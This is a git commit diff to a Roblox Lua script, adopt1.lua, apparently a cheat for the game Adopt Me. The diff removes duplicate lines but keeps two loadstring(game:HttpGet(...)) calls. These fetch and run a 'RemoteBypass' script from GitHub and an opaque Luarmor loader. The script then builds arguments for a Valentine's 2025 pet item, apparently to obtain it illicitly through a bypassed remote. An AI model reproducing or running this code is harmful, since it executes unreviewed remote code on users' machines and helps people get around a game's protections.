280f5b99603e45d5208e2aa4cd14c9339d941973
greg66n <darien95sm@hotmail.com>
2025-02-17 10:18:02 -0800

    Update adopt1.lua

--- adopt1.lua
+++ adopt1.lua
@@ -2,11 +2,7 @@ wait(0.1)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
 wait(0.1)
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/08615e5f6a25239a4ffa9b6203728d70.lua"))()
-wait(0.1)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
-wait(0.1)
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/08615e5f6a25239a4ffa9b6203728d70.lua"))()
-wait(0.1)
+wait(1)
 local args = {
     [1] = "pets",
     [2] = "valentines_2025_love_bird",
